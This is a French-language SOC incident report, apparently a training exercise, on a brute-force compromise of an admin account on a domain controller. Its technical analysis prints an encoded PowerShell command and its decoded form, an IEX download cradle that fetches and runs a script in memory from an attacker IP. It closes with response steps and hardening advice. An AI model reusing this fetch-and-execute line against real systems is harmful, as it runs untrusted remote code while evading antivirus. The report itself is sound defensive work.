# 🚨 Rapport d'Incident : Brute Force & Exécution PowerShell

## 📝 1. Résumé de l'incident
Une alerte critique a été déclenchée par le SIEM suite à de multiples échecs d'authentification sur un compte administrateur, suivis d'une connexion réussie et de l'exécution d'une commande PowerShell malveillante sur le Contrôleur de Domaine (`SRV-DC-01`).

## 🔍 2. Indicateurs de Compromission (IOC)
- **IP source de l'attaque :** `185.15.20.10`
- **Compte compromis :** `admin_it`
- **Serveur ciblé :** `SRV-DC-01` (Contrôleur de Domaine)
- **URL malveillante :** `http://185.15.20.10/malware.ps1`
- **Événements Windows :** Event ID 4625 (Échec), Event ID 4624 (Succès), Event ID 4688 (Création de processus)

## 🔬 3. Analyse technique
L'attaquant a effectué une attaque par force brute (Brute Force) sur le compte `admin_it`. Après 50 échecs (Event 4625), il a réussi à deviner le mot de passe (Event 4624) à 03h14.
Cinq minutes plus tard, l'attaquant a lancé une commande PowerShell obfusquée (encodée en Base64) :
`powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADUALgAyADAALgAxADAALwBtAGEAbAB3AGEAcgBlAC4AcABzADEAJwApAA==`

Une fois décodée, la commande révèle un **Fileless Malware** :
`IEX (New-Object Net.WebClient).DownloadString('http://185.15.20.10/malware.ps1')`
Le script télécharge un malware et l'exécute directement en mémoire (RAM) pour contourner l'antivirus.

## 🛑 4. Actions de Réponse (Incident Response)
1. **Confinement :** Blocage de l'IP `185.15.20.10` sur le pare-feu et désactivation immédiate du compte `admin_it` dans l'Active Directory.
2. **Éradication :** Arrêt forcé du processus `powershell.exe` via l'EDR et ajout de l'URL sur la blacklist du proxy.
3. **Remédiation :** Réinitialisation du mot de passe du compte admin avec une politique stricte. Vérification des tâches planifiées pour éliminer toute persistance.

## 💡 5. Recommandations
- Déployer l'**Authentification Multifacteurs (MFA)** pour tous les comptes à privilèges.
- Mettre en place une politique de **verrouillage de compte** (Account Lockout) après 5 échecs de connexion.
- Restreindre l'exécution de PowerShell (via les GPO) pour les utilisateurs qui n'en ont pas besoin.

---
*Rapport rédigé par KAI-ARLA - Analyste SOC Junior*
